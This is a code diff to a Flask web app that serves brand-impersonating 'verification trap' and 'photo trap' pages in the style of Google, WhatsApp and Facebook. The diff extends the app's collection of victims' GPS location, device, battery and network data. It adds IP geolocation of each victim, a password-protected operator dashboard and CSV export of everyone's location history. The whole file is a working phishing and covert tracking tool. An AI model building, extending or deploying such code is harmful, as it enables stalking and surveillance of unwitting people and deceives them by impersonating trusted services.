@@ -1,9 +1,12 @@
-from flask import Flask, request, render_template, jsonify
+from flask import Flask, request, render_template, jsonify, session, redirect, url_for
 from flask_cors import CORS
 import os
+import secrets
+import requests
 from datetime import datetime
 
 app = Flask(__name__)
+app.secret_key = secrets.token_hex(16)  # For dashboard auth
 CORS(app)
 
 # =============================================
@@ -18,36 +21,81 @@ latest_location = {
     "lat": None, "lng": None, "accuracy": None,
     "altitude": None, "heading": None, "speed": None,
     "timestamp": None, "device_info": None,
-    "battery": None, "network": None
+    "battery": None, "network": None,
+    "ip": None, "ip_city": None, "ip_country": None, "ip_isp": None
 }
+
+# =============================================
+# IP GEOLOCATION HELPER
+# =============================================
+
+def get_ip_info(ip):
+    """Fetch city, country, ISP from ip-api.com (free, no API key required)"""
+    try:
+        url = f'http://ip-api.com/json/{ip}?fields=status,country,city,isp,lat,lon'
+        response = requests.get(url, timeout=5)
+        data = response.json()
+        if data.get('status') == 'success':
+            return {
+                'city': data.get('city', 'N/A'),
+                'country': data.get('country', 'N/A'),
+                'isp': data.get('isp', 'N/A'),
+                'lat': data.get('lat'),
+                'lon': data.get('lon')
+            }
+    except Exception as e:
+        print(f"IP Geolocation error: {e}")
+    return None
 
 # =============================================
 # ROUTES
 # =============================================
 
-# --- Clean URL Routes (NEW) ---
+# --- Clean URL Routes ---
 @app.route('/<brand>/verify')
 def verify_trap_clean(brand):
-    """Clean URL for verification trap: /google/verify, /whatsapp/verify, etc."""
     return render_template('index.html', brand=brand)
 
 @app.route('/<brand>/photo')
 def photo_trap_clean(brand):
-    """Clean URL for photo trap: /whatsapp/photo, /facebook/photo, etc."""
     return render_template('photo.html', brand=brand)
 
-# --- Legacy Routes (keep for backward compatibility) ---
+# --- Legacy Routes (backward compatibility) ---
 @app.route('/')
 def target_page():
     template = request.args.get('template', 'google')
-    return render_template('index.html', brand=None)  # brand=None => fallback to query param
+    return render_template('index.html', brand=None)
 
 @app.route('/photo')
 def photo_trap():
     template = request.args.get('template', 'whatsapp')
-    return render_template('photo.html', brand=None)  # brand=None => fallback to query param
+    return render_template('photo.html', brand=None)
 
-# --- API Endpoints (unchanged) ---
+# --- Dashboard (with password protection) ---
+DASHBOARD_PASSWORD = "your_strong_password"  # CHANGE THIS!
+
+@app.route('/dashboard-login', methods=['GET', 'POST'])
+def dashboard_login():
+    if request.method == 'POST':
+        if request.form.get('password') == DASHBOARD_PASSWORD:
+            session['logged_in'] = True
+            return redirect(url_for('dashboard'))
+        return "Wrong Password", 403
+    return '''
+        <form method="post" style="margin:20% auto;width:300px;text-align:center;font-family:Arial;">
+            <h2>🔐 Admin Access</h2>
+            <input type="password" name="password" placeholder="Enter Password" style="width:100%;padding:10px;margin:10px 0;border-radius:4px;border:1px solid #ccc;">
+            <button type="submit" style="padding:10px 30px;background:#4285f4;color:white;border:none;border-radius:4px;cursor:pointer;">Unlock</button>
+        </form>
+    '''
+
+@app.route('/dashboard')
+def dashboard():
+    if not session.get('logged_in'):
+        return redirect(url_for('dashboard_login'))
+    return render_template('dashboard.html')
+
+# --- API Endpoints ---
 @app.route('/send-location', methods=['POST'])
 def receive_location():
     global users, all_history, latest_location
@@ -57,6 +105,13 @@ def receive_location():
     
     if not session_id:
         session_id = request.remote_addr or 'unknown'
+    
+    # Get real client IP (Render uses X-Forwarded-For)
+    forwarded = request.headers.get('X-Forwarded-For')
+    client_ip = forwarded.split(',')[0].strip() if forwarded else request.remote_addr
+    
+    # Fetch IP info
+    ip_info = get_ip_info(client_ip)
     
     location_data = {
         "lat": data.get('lat'),
@@ -69,7 +124,14 @@ def receive_location():
         "battery": data.get('battery'),
         "network": data.get('network'),
         "timestamp": datetime.now().isoformat(),
-        "session_id": session_id
+        "session_id": session_id,
+        # --- IP fields ---
+        "ip": client_ip,
+        "ip_city": ip_info.get('city') if ip_info else None,
+        "ip_country": ip_info.get('country') if ip_info else None,
+        "ip_isp": ip_info.get('isp') if ip_info else None,
+        "ip_lat": ip_info.get('lat') if ip_info else None,
+        "ip_lon": ip_info.get('lon') if ip_info else None
     }
 
     # Store per user
@@ -90,7 +152,7 @@ def receive_location():
     # Update fallback
     latest_location = location_data
 
-    print(f"📍 Location from {session_id}: {location_data}")
+    print(f"📍 Location from {session_id} (IP: {client_ip}): {location_data}")
     print(f"👥 Total users: {len(users)}")
 
     return jsonify({"status": "ok", "session_id": session_id})
@@ -117,7 +179,6 @@ def get_location():
 
 @app.route('/get-users')
 def get_users():
-    """Return all users and their current locations"""
     user_list = []
     for sid, data in users.items():
         user_list.append({
@@ -128,17 +189,17 @@ def get_users():
             "device_info": data["current"].get("device_info"),
             "timestamp": data["current"].get("timestamp"),
             "battery": data["current"].get("battery"),
-            "network": data["current"].get("network")
+            "network": data["current"].get("network"),
+            "ip": data["current"].get("ip"),
+            "ip_city": data["current"].get("ip_city"),
+            "ip_country": data["current"].get("ip_country"),
+            "ip_isp": data["current"].get("ip_isp")
         })
     return jsonify(user_list)
 
 @app.route('/get-all-history')
 def get_all_history():
     return jsonify(all_history)
-
-@app.route('/dashboard')
-def dashboard():
-    return render_template('dashboard.html')
 
 @app.route('/clear', methods=['POST', 'GET'])
 def clear_location():
@@ -149,9 +210,39 @@ def clear_location():
         "lat": None, "lng": None, "accuracy": None,
         "altitude": None, "heading": None, "speed": None,
         "timestamp": None, "device_info": None,
-        "battery": None, "network": None
+        "battery": None, "network": None,
+        "ip": None, "ip_city": None, "ip_country": None, "ip_isp": None
     }
     return jsonify({"status": "cleared"})
+
+# --- CSV Export (Bonus) ---
+@app.route('/export-csv')
+def export_csv():
+    global all_history
+    if not all_history:
+        return "No data", 404
+    
+    output = []
+    for entry in all_history:
+        output.append({
+            'Session': entry.get('session_id'),
+            'Lat': entry.get('lat'),
+            'Lng': entry.get('lng'),
+            'Accuracy': entry.get('accuracy'),
+            'Device': entry.get('device_info', {}).get('device_name'),
+            'Battery': entry.get('battery', {}).get('level', 'N/A'),
+            'City': entry.get('ip_city', 'N/A'),
+            'Country': entry.get('ip_country', 'N/A'),
+            'ISP': entry.get('ip_isp', 'N/A'),
+            'Timestamp': entry.get('timestamp')
+        })
+    
+    def generate():
+        yield ','.join(output[0].keys()) + '\n'
+        for row in output:
+            yield ','.join(str(v) for v in row.values()) + '\n'
+    
+    return Response(generate(), mimetype='text/csv', headers={"Content-Disposition": "attachment;filename=locations.csv"})
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 10000))
